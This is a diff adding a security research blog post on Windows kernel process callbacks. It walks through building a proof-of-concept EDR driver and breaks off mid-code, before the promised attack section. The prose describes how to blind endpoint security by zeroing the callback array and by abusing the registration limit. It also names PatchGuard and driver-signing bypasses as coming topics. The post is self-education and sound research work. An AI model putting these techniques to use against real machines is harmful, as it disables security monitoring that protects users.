@@ -1,0 +1,1364 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    
+    <meta name="description" content="I won&rsquo;t be sharing any 0day here (well, maybe a &ldquo;nday&rdquo; if you haven&rsquo;t been looking into ring0 that much). The fact is, there&rsquo;s not much public information about this subject (attacks against the Windows Kernel Ps callbacks). To play a little bit with these kernel callbacks, I &ldquo;wrote&rdquo; (yes, in commas) a pseudo-EDR proof-of-concept (that uses these Ps callbacks). This post tells the story of some of these ring0 experiments.">
+    <meta name="keywords" content="homepage, blog, reversing, binary exploitation, kernel, hypervisor, containers">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Windows Kernel Ps Callbacks Experiments"/>
+<meta name="twitter:description" content="I won&rsquo;t be sharing any 0day here (well, maybe a &ldquo;nday&rdquo; if you haven&rsquo;t been looking into ring0 that much). The fact is, there&rsquo;s not much public information about this subject (attacks against the Windows Kernel Ps callbacks). To play a little bit with these kernel callbacks, I &ldquo;wrote&rdquo; (yes, in commas) a pseudo-EDR proof-of-concept (that uses these Ps callbacks). This post tells the story of some of these ring0 experiments."/>
+
+    <meta property="og:title" content="Windows Kernel Ps Callbacks Experiments" />
+<meta property="og:description" content="I won&rsquo;t be sharing any 0day here (well, maybe a &ldquo;nday&rdquo; if you haven&rsquo;t been looking into ring0 that much). The fact is, there&rsquo;s not much public information about this subject (attacks against the Windows Kernel Ps callbacks). To play a little bit with these kernel callbacks, I &ldquo;wrote&rdquo; (yes, in commas) a pseudo-EDR proof-of-concept (that uses these Ps callbacks). This post tells the story of some of these ring0 experiments." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://deniable.org/posts/windows-callbacks/" />
+<meta property="article:published_time" content="2020-02-29T04:15:29+01:00" />
+<meta property="article:modified_time" content="2020-02-29T04:15:29+01:00" /><meta property="og:site_name" content="shut up and hack" />
+
+
+    <title>
+  Windows Kernel Ps Callbacks Experiments · shut up and hack
+</title>
+
+    
+      <link rel="canonical" href="http://deniable.org/posts/windows-callbacks/">
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
+      integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8/normalize.min.css">
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.15d3dcd7d56ff7df8a54a0659da83058d38fb1814fa8dad387efc92034b70def.css" integrity="sha256-FdPc19Vv99&#43;KVKBlnagwWNOPsYFPqNrTh&#43;/JIDS3De8=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.126ad3988d46bdae6217a11105b53c9662bca05f39d42d3c0fb366919d334620.css" integrity="sha256-EmrTmI1Gva5iF6ERBbU8lmK8oF851C08D7NmkZ0zRiA=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+
+    <meta name="generator" content="Hugo 0.74.3" />
+  </head>
+
+  
+  
+    
+  
+  <body class="colorscheme-dark"
+        onload=""
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      shut up and hack
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/projects">Projects</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Windows Kernel Ps Callbacks Experiments</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2020-02-29T04:15:29&#43;01:00'>
+                February 29, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              61-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <p>I won&rsquo;t be sharing any 0day here (well, maybe a &ldquo;nday&rdquo; if you haven&rsquo;t been looking into <code>ring0</code> that much). The fact is, there&rsquo;s not much public information about this subject (attacks against the Windows Kernel Ps callbacks). To play a little bit with these kernel callbacks, I &ldquo;wrote&rdquo; (yes, in commas) a pseudo-<a href="https://en.wikipedia.org/wiki/Endpoint_Detection_and_Response">EDR</a> proof-of-concept (that uses these Ps callbacks). This post tells the story of some of these <code>ring0</code> experiments.</p>
+<p>My experience with the Windows Kernel comes from writing exploits for memory corruption bugs. I&rsquo;ve never worked at Microsoft or any other big hardware/AV company. I&rsquo;m not a programmer, and I don&rsquo;t have access to source code (besides the one that everyone has). So, my overall knowledge of the Windows kernel is limited. I found some bugs and wrote some &lsquo;gangster&rsquo; kernel exploits, but that&rsquo;s it.</p>
+<p>What I&rsquo;m trying to say is, the subject discussed here is presented in the interest of exploring the Windows kernel for self-education. I&rsquo;ve tried to be as precise as possible (without being exhaustive), still is very likely that I made mistakes, I&rsquo;m misinformed, or I forgot to mention something important. I apologise in advance. If you observe any mistakes/errors please let me know.</p>
+<p>A while ago I looked at a commercial EDR solution from a low-level exploitation, and anti-tampering, perspective. I can&rsquo;t disclose the name of the vendor, and I can&rsquo;t talk about my findings. Don&rsquo;t ask, I won&rsquo;t even mention it again. However, that&rsquo;s what revamped my interest in the Windows Kernel Ps Callback Functions. These callbacks are only used in drivers, and not in the kernel per si. Many Endpoint Security solutions (anti-virus, EDRs, HIDS/HIPS, etc) register these callbacks to monitor, and track, system activity. Kernel-mode <a href="https://en.wikipedia.org/wiki/Rootkit">Rootkits</a> also make use of them, sometimes. <a href="https://www.microsoft.com/">Microsoft</a> has been improving the capabilities of these callbacks (since <a href="https://en.wikipedia.org/wiki/Windows_Vista">Vista</a>), and software companies (like Endpoint Security Solutions vendors, and others) are shifting their <a href="https://en.wikipedia.org/wiki/Hooking">hook</a> based monitoring technology to these Kernel Notification Callbacks (plus the obvious <strong>Ob</strong> callbacks, <strong>Cm</strong> callbacks and <strong>mini-filter</strong> drivers, even though <strong>I won&rsquo;t be talking about these in this post</strong>).</p>
+<p>Windows allows kernel drivers to register callback routines, which will then be called when a particular event occurs (like process/threads execution and termination, image loads, registry operations, and many others). When the event occurs the callback routine will be invoked, and the necessary action (as blocking it) can be taken.</p>
+<p>Quoting MSDN, <em><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/callback-objects">The kernel&rsquo;s callback mechanism provides a general way for drivers to request and provide notification when certain conditions are satisfied. A driver can create a callback object, and other drivers can request notification for conditions associated with this driver-defined callback.</a></em></p>
+<p>You can find a <em>comprehensive list</em> of <em>all the APIs exported by the Windows Kernel, for driver writes to register callback routines that are invoked by kernel components under various circumstances</em> <a href="https://www.codemachine.com/article_kernel_callback_functions.html">here</a>. You can, and should, also look at the Windows Driver Kit (WDK) since they are well documented there. Note that there are still some others undocumented though.</p>
+<p>While these Kernel Callbacks are mostly documented from a development perspective, I didn&rsquo;t find much information regarding implementation weaknesses and offensive research focused on them. Initially, I mainly looked at <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex">PsSetCreateProcessNotifyRoutineEx</a> and most of what I&rsquo;m presenting here is around this process notification callback. However, it applies pretty much the same way to threads, Image loads, and Registry operations (as we&rsquo;ll see).</p>
+<p>Process notification callbacks are registered via <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine">PsSetCreateProcessNotifyRoutine</a>, <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex">PsSetCreateProcessNotifyRoutineEx</a>, and <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex2">PsSetCreateProcessNotifyRoutineEx2</a>.</p>
+<p><code>PsSetCreateProcessNotifyRoutineEx</code> is the same as the former but also allows you to block process creation, and <code>PsSetCreateProcessNotifyRoutineEx2</code> is also invoked for Linux processes (<a href="https://docs.microsoft.com/en-us/windows/wsl/faq">Windows Subsystem for Linux (WSL)</a>). We&rsquo;ll ignore the last for now. These callbacks notify routine addresses are added to an array, the <code>nt!PspCreateProcessNotifyRoutine</code> array. So whenever a process is being created (or terminated), the <code>nt!PspCallProcessNotifyRoutines</code> iterates over this array and calls <strong>all</strong> the registered callbacks. And this is where you can start smiling. If you have done some Windows Kernel Exploitation, you know that once you have a primitive that allows you write into kernel memory the system is compromised. Even if you can write 1 byte only (more on this later).</p>
+<p>Endpoint Security solutions (AVs, EDRs, Anti-Cheating Engines, etc), and others like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a>, <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Procmon</a>, <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a>, and so on, they all make use of Kernel Callbacks. I &ldquo;heard&rdquo; that some AVs are still getting away with some forms of Kernel Hooking in 64-bit systems, relying on <a href="https://en.wikipedia.org/wiki/Kernel_Patch_Protection">KPP</a> bypasses. I won&rsquo;t mention names. Anyway, all the few solutions I briefly looked at were using these Kernel Callbacks. There are some <a href="https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/">EDRs doing userland hooking</a> but I won&rsquo;t talk about those. That&rsquo;s not in scope for this post. One thing I know, <a href="https://en.wikipedia.org/wiki/Kernel_Patch_Protection">KPP</a> is not available on 32-bit systems so it&rsquo;s very likely that some AVs didn&rsquo;t rewrite their engine for this platform. Anyway, no one cares about 32-bit anymore (including myself).</p>
+<p>The problem here is that, as mentioned before, these callbacks are stored in an array. This means that if I can zero out that array somehow, they will stop working. If we can set callbacks, we can also delete them. Right? Well&hellip; <em>&ldquo;you need to be running code in ring zero for that&rdquo;</em>. True, but you know&hellip; since Administrator to Kernel is not a security boundary&hellip;</p>
+<p>Apart from the pseudo-EDR kernel driver, I also wrote an <a href="https://github.com/houseofxyz/windows-ps-callbacks-experiments">Evil</a> kernel driver that will somehow mess with our EDR (and eventually other software making use of these same callbacks). We&rsquo;ll see how it can be (ab)used, and while here also talk a little bit about <a href="https://en.wikipedia.org/wiki/Kernel_Patch_Protection">Kernel Patch Protection (KPP)</a>, widely known as <code>PatchGuard</code>, and <!-- raw HTML omitted -->Driver Signature Enforcement<!-- raw HTML omitted --> bypasses.</p>
+<p>If you want to follow along with this post, I would recommend you to get two Windows 10 VMs. One (the <code>debugger</code>/host) with a kernel <code>debugger</code>, <code>kd.exe</code>, from the Windows Debug Tools. If you feel like going crazy fancy use <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugging-using-windbg-preview">WinDbg Preview</a>. Additionally, <a href="https://visualstudio.microsoft.com/vs/">Visual Studio 2019</a> (the free version is enough) with the <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk">WDK</a>, and the <a href="https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk">SDK</a>. On the <code>debuggee</code>/target, I would say that you&rsquo;ll only need <a href="https://processhacker.sourceforge.io/">Process Hacker</a>. That&rsquo;s it, all the required software is available for free.</p>
+<p>As a last note, before we begin, there&rsquo;s another option for being notified when processes are created, or terminated. <a href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing">Event Tracing for Windows (ETW)</a>. However, it is not possible to prevent a process from being created this way. Also, there&rsquo;s a considerable delay regarding the notification delivery that makes this impractical depending on your &ldquo;mission&rdquo;. A short-lived process can exit before the notification arrives. We won&rsquo;t talk about these here. The Windows Kernel Notification Callbacks are sent as &ldquo;part of&rdquo; process creation, and the driver cannot miss any process created and terminated quickly.</p>
+<h2 id="the-edr-kernel-mode-driver">The EDR (Kernel Mode Driver)</h2>
+<h4 id="writing-an-edr-for-fun-and-potential-profit-if-you-are-willing-to-write-a-web-interface">Writing an EDR for fun, and potential profit, if you are willing to write a web interface</h4>
+<p>I wanted to play with these Windows Kernel Ps Callbacks. However, I didn&rsquo;t have an EDR, or AV to play with. Well, AVs are cheap these days, I know. But the infosec buzzword at the moment is EDR. There are plenty, but none will give me access for free to their solution to play with it. So why not write my own?</p>
+<p>If you never wrote a Windows Kernel Driver before, there&rsquo;s this book, from <a href="https://twitter.com/zodiacon">Pavel Yosifovich</a>, <a href="https://leanpub.com/windowskernelprogramming">Windows Kernel Programming</a> that I recommend you to grab a copy. This book kinda gives you all the foundations to write a driver <strong>using these Ps callbacks</strong>. Please note that it barely touches mini-filter drivers, but that&rsquo;s not a surprise. You can pick one of his Kernel Mode Driver project&rsquo;s and start building on top of it. That&rsquo;s what I did for the EDR kernel driver, plus many other &ldquo;features&rdquo; I added myself. So, if you want to do the same, or learn about the subject, look at the book. If you already know a bit about Windows Kernel programming probably you&rsquo;ll hate the book, if you don&rsquo;t I believe you&rsquo;ll like it and find it useful.</p>
+<p>Moving forward, the pseudo &ldquo;EDR&rdquo; I wrote (at the moment) has the ability to:</p>
+<ul>
+<li>detect process creation and termination</li>
+<li>detect thread creation and termination</li>
+<li>detect Image loads</li>
+<li>block process creation based on the executable name</li>
+<li>detect DLL injection (kind of)</li>
+</ul>
+<p>If you are willing to write a web interface, and you are looking for an idea to get your startup going, here it is. Grab the code, write the web interface, get some investors, slack for a year or two, sell the company, and pocket some millions (hopefully). Joking.</p>
+<p>The code will be available on <a href="https://github.com/houseofxyz/windows-ps-callbacks-experiments">GitLab</a>, one day. Be warned that I&rsquo;m not a programmer, and I take zero responsibility for <a href="https://en.wikipedia.org/wiki/Fatal_system_error">bugchecks</a>. The focus of this post is not how to write a kernel driver. I&rsquo;ll just show you how this pseudo-EDR works, you can eventually use it for your testing purposes. As of today, I didn&rsquo;t bother testing the driver in multiple Windows versions. I only tested it on <strong>Windows 10 x64 1903 19H1</strong> and a few other Windows versions. I might add support for other Windows versions but probably only for 64-bit systems. No one cares about 32-bit anymore. If you want it working on a 32-bit system it should be really easy to &ldquo;fix it&rdquo; though. I&rsquo;ll probably do it myself at some point just for fun. Anyway, use Windows 10 x64 1903 19H1 as your target. Otherwise, there are <strong>zero</strong> guarantees that everything will work as presented here. It&rsquo;s not my intention to write commercial grade rock-solid software, and honestly, this is just a <code>PoC</code> and I couldn&rsquo;t care less about supporting multiple Windows versions.</p>
+<p>As you might know, or not know, to load an <strong>unsigned driver</strong> you need to enable <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option">test signing mode</a>. I won&rsquo;t go through the setup steps, these have been documented all over the Internet. A simple Google search is enough to get you going. You&rsquo;ll also have to setup kernel debugging as mentioned before. Again, Google is your friend (and a close one, since it knows everything about you). Use it.</p>
+<p>Once you enable test signing mode you&rsquo;ll get a nice watermark on the bottom right corner of the screen, like the one below.</p>
+<p><img src="/callbacks/testing.png" alt=""></p>
+<p>You&rsquo;ll have to build the code yourself, fun! If you haven&rsquo;t installed Windows Visual Studio 2019, and WDK, in this exact order, now is the time. After building the code you&rsquo;ll end up with 3 files (<code>edr.sys</code>, <code>alerts.exe</code>, and <code>edrcli.exe</code>). I recommend you to build them with debug information for &ldquo;better user experience&rdquo;. Jokes aside, I added a lot of debugging information and that will help you understand better what&rsquo;s going on.</p>
+<p>Here&rsquo;s the functionality of each one of the files.</p>
+<ul>
+<li>edr.sys (the pseudo-EDR kernel-mode driver)</li>
+<li>alerts.exe (the client that will let you get all the information from the kernel-mode driver)</li>
+<li>edrcli.exe (the client that lets you add process names that shouldn&rsquo;t be allowed to start)</li>
+</ul>
+<p>You can load the <code>edr.sys</code> driver the same way you install a user-mode service. You can use the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea">CreateService</a> API, you can use <a href="https://www.osronline.com/article.cfm%5Earticle=157.htm">OSR driver loader</a>, you can use whatever you want. Or, you can just use the Windows built-in and most well known, tool for this. <code>sc.exe</code>, which is what I use myself. There&rsquo;s no need to install any extra tools, honestly.</p>
+<p>We can install the driver as an <code>Administrator</code> only. So open an elevated command prompt and type (assuming you have the driver in the <code>Desktop</code> folder as I do, and change the username accordingly):</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sc create edr type= kernel binPath= c:\users\rui\Desktop\edr.sys
+</code></pre></div><p>Pay attention to the spaces. You should now have the following registry key <code>HKLM\System\CurrentControlSet\Services\Edr</code>. We&rsquo;ll eventually talk about it later. To start the driver type:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sc start edr
+</code></pre></div><p>I hope you have a Kernel Debugger attached by now (and hopefully the machine didn&rsquo;t <code>bugcheck</code>), so you should see some messages with the Driver Prefix <code>[EDR]</code>. You can also use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/debugview">DebugView</a> from Sysinternals to see the debug messages, just make sure you enable the kernel debug messages. To avoid a lot of noise I still recommend you to just use <code>kd.exe</code>) with the following <code>KD</code> mask:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ed nt!Kd_Default_Mask 8
+</code></pre></div><p>You can set <code>Kd_default_mask</code> to <code>f</code> to enable every possible debug message, although <code>8</code> should be enough to catch our unadorned <code>KdPrint</code> (customized <code>DbgPrint</code>). To revert it:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ed nt!Kd_Default_Mask 0x0
+</code></pre></div><p>Note: if you are developing kernel-mode drivers I recommend you to automate everything as much as possible, but I&rsquo;ll leave that as an exercise for you. This is just a messy demo with files all over the <code>Desktop</code> folder.</p>
+<p>Let&rsquo;s get started. To register, and start, your EDR driver (<code>edr.sys</code>) use the commands mentioned above and once you get it loaded and running use the <code>alerts.exe</code> to see what&rsquo;s going on.</p>
+<p><img src="/callbacks/edr001.png" alt=""></p>
+<p>If you launch <code>alerts.exe</code> without any parameter you&rsquo;ll get all the notifications for processes, and threads, start and exit, plus Image loads as shown above. If you want a more granular view you can use the following command line switches.</p>
+<p><img src="/callbacks/edr002.png" alt=""></p>
+<p>Nothing fancy.</p>
+<p>So, how does the kernel allows drivers to be notified of these specific events?</p>
+<h3 id="process-notifications">Process Notifications</h3>
+<p>As mentioned before, a driver can be notified when a process is created, or terminated, by registering a notification function with <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine">PsSetCreateProcessNotifyRoutine</a>. Or, with <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex">PsSetCreateProcessNotifyRoutineEx</a>, or <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex2">PsSetCreateProcessNotifyRoutineEx2</a>.</p>
+<p>The main API is <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex">PsSetCreateProcessNotifyRoutineEx</a>, and that&rsquo;s one we&rsquo;ll be using in our pseudo-EDR driver. As we can read on MSDN, <em>The PsSetCreateProcessNotifyRoutineEx routine registers or removes a callback routine that notifies the caller when a process is created or exits.</em></p>
+<p>We can find its definition in the <a href="https://github.com/houseofxyz/wdk-header-files/blob/master/win10rs5/ntddk.h">ntddk.h</a> header file.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">NTKERNELAPI
+NTSTATUS
+PsSetCreateProcessNotifyRoutineEx (
+    _In_ PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,
+    _In_ BOOLEAN Remove
+    );
+</code></pre></div><p>The first parameter is <em>a pointer to the <a href="https://docs.microsoft.com/windows-hardware/drivers/ddi/ntddk/nc-ntddk-pcreate_process_notify_routine_ex">PCREATE_PROCESS_NOTIFY_ROUTINE_EX</a> routine to register or remove. The operating system calls this routine whenever a new process is created.</em></p>
+<p>In our driver, this routine is called <code>OnProcessNotify</code> and can be found on the <code>Edr.cpp</code> file. We register it inside the <code>DriverEntry</code> function, as shown below.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">status = PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);
+<span style="color:#fff;font-weight:bold">if</span> (!NT_SUCCESS(status)) {
+    KdPrint((DRIVER_PREFIX <span style="color:#0ff;font-weight:bold">&#34;failed to register process callback (0x%08X)</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, status));
+    <span style="color:#fff;font-weight:bold">break</span>;
+}
+</code></pre></div><p>Note: there&rsquo;s a maximum limit of 64 callback registrations, which means the API call above can fail. This is a limitation that can be abused.</p>
+<p>The second parameter, set to <code>FALSE</code> above, is a <em>Boolean value that specifies whether PsSetCreateProcessNotifyRoutineEx will add or remove a specified routine from the list of callback routines. If this parameter is TRUE, the specified routine is removed from the list of callback routines. If this parameter is FALSE, the specified routine is added to the list of callback routines. If Remove is TRUE, the system also waits for all in-flight callback routines to complete before returning.</em></p>
+<p>Pretty simple.</p>
+<p>The first argument, as shown above, has the following prototype (defined on the same header file).</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#fff;font-weight:bold">typedef</span>
+VOID
+(*PCREATE_PROCESS_NOTIFY_ROUTINE_EX) (
+    _Inout_ PEPROCESS Process,
+    _In_ HANDLE ProcessId,
+    _Inout_opt_ PPS_CREATE_NOTIFY_INFO CreateInfo
+    );
+</code></pre></div><p>And the data structure for process creation is defined on the same header file, as shown below.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#fff;font-weight:bold">typedef</span> <span style="color:#fff;font-weight:bold">struct</span> _PS_CREATE_NOTIFY_INFO {
+    _In_ SIZE_T Size;
+    <span style="color:#fff;font-weight:bold">union</span> {
+        _In_ ULONG Flags;
+        <span style="color:#fff;font-weight:bold">struct</span> {
+            _In_ ULONG FileOpenNameAvailable : <span style="color:#ff0;font-weight:bold">1</span>;
+            _In_ ULONG IsSubsystemProcess : <span style="color:#ff0;font-weight:bold">1</span>;
+            _In_ ULONG Reserved : <span style="color:#ff0;font-weight:bold">30</span>;
+        };
+    };
+    _In_ HANDLE ParentProcessId;
+    _In_ CLIENT_ID CreatingThreadId;
+    _Inout_ <span style="color:#fff;font-weight:bold">struct</span> _FILE_OBJECT *FileObject;
+    _In_ PCUNICODE_STRING ImageFileName;
+    _In_opt_ PCUNICODE_STRING CommandLine;
+    _Inout_ NTSTATUS CreationStatus;
+} PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO;
+</code></pre></div><p>An important field from the structure above is the <code>CreationStatus</code> since this is the status that will be returned to the caller. In this pseudo-EDR driver, I added the ability to block processes from starting up using this field (by returning <code>STATUS_ACCESS_DENIED</code>).</p>
+<h3 id="blocking-process-creation">Blocking process creation</h3>
+<p>To configure which processes should be blocked, I wrote a small userland utility that communicates with the EDR driver. It allows you to add process names to a doubly-linked list (<a href="https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry">LIST_ENTRY</a>) in the kernel where these process names are kept. Every time a new process starts, an in-line notification is sent to the EDR driver. The EDR driver looks at this doubly linked list and allows the process to start, or not.</p>
+<p>This is just a proof-of-concept, so feel free to improve it. It just checks the process file name, so if you change it you bypass it. The point here is to simply make you think what are some of the limitations, or challenges that developers of this type of technology have to face. Like, where to keep this information? How to handle it? Are we going to keep a doubly linked list in the kernel with thousands of processes, command-line switches, and check it every time a new process starts? Should we use regular expressions? Parsing this in the kernel doesn&rsquo;t sound like a good idea, right? Is this fine? Is this heavy? Should we use a database in user-mode? What&rsquo;s the best approach to handle this? I guess you get the point.</p>
+<p>Anyway, to add process names to this doubly linked list and block their execution you can use the <code>edrcli.exe</code> client with the <code>-i</code> switch.</p>
+<p><img src="/callbacks/edr003.png" alt=""></p>
+<p>Let&rsquo;s say we want to block <code>procexp64.exe</code> from starting.</p>
+<p><img src="/callbacks/edr004.png" alt=""></p>
+<p>After you add it to the doubly linked list mentioned above, here&rsquo;s what happens.</p>
+<p><img src="/callbacks/procexp64_block.gif" alt=""></p>
+<p>You can add up to 10 process names, by default. This value is hardcoded, and you can change this in the code. Check the <code>Edr.h</code> header file and change the <code>define MAX_NR_PROC_TO_BLOCK</code>. Even better, would be to simply read this value from a registry key (feel free to write the code for this).</p>
+<p>If this maximum cap is reached, the oldest one is deleted and the new one is added. See below the code responsible for this in the <code>Edr.cpp</code> file.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#fff;font-weight:bold">if</span> (g_Globals.NodeCount &gt;= MAX_NR_PROC_TO_BLOCK)
+{
+    KdPrint((<span style="color:#0ff;font-weight:bold">&#34;[EDR] Max # of process to block reached. Deleting the oldest one.</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>));
+    <span style="color:#fff;font-weight:bold">auto</span> tail = RemoveTailList(&amp;g_Globals.ProcListHead);
+    <span style="color:#fff;font-weight:bold">auto</span> record = CONTAINING_RECORD(tail, FullItem&lt;ProcessDenyInfo&gt;, Entry);
+    ExFreePool(record);
+    g_Globals.NodeCount--;
+}
+</code></pre></div><p>Anyway, if you add multiple processes and then try to get the list of the processes currently in the doubly linked list with the <code>-l</code> switch you&rsquo;ll get:</p>
+<p><img src="/callbacks/edr006.png" alt=""></p>
+<p>Yep, I didn&rsquo;t finish this because I didn&rsquo;t care. Maybe later. However, you can still see the contents of the doubly linked list if you have a kernel debugger attached.</p>
+<p><img src="/callbacks/edr005.png" alt=""></p>
+<p>Feel free to write the code that sends this data back to the user-mode client. I have multiple examples of how to do it in the <code>Visual Studio</code> project. Anyway, how is this achieved? Inside our <code>OnProcessNotify</code> function, we have the following.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#fff;font-weight:bold">if</span> (CreateInfo)
+{
+	<span style="color:#fff;font-weight:bold">if</span>(!IsListEmpty(&amp;g_Globals.ProcListHead))
+	{
+		AutoLock&lt;FastMutex&gt; lock(g_Globals.ProcMutex);
+
+		PLIST_ENTRY pENTRY = g_Globals.ProcListHead.Flink;
+		<span style="color:#fff;font-weight:bold">while</span>(pENTRY != &amp;g_Globals.ProcListHead)
+		{
+			<span style="color:#fff;font-weight:bold">auto</span> node = CONTAINING_RECORD(pENTRY, FullItem&lt;ProcessDenyInfo&gt;, Entry);
+			<span style="color:#fff;font-weight:bold">auto</span> pname = node-&gt;Data.ProcessName;
+			KdPrint((DRIVER_PREFIX <span style="color:#0ff;font-weight:bold">&#34; -&gt; %S</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, pname));
+
+			<span style="color:#fff;font-weight:bold">if</span> (wcsstr(CreateInfo-&gt;ImageFileName-&gt;Buffer, pname))
+			{
+				CreateInfo-&gt;CreationStatus = STATUS_ACCESS_DENIED;
+				KdPrint((DRIVER_PREFIX <span style="color:#0ff;font-weight:bold">&#34;No Way Jose! Access to: </span><span style="color:#0ff;font-weight:bold">\&#34;</span><span style="color:#0ff;font-weight:bold">%S</span><span style="color:#0ff;font-weight:bold">\&#34;</span><span style="color:#0ff;font-weight:bold"> is... Denied!!!</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, pname));
+				<span style="color:#fff;font-weight:bold">return</span>;
+			}
+
+			pENTRY = pENTRY-&gt;Flink;
+		}
+	}
+(...)
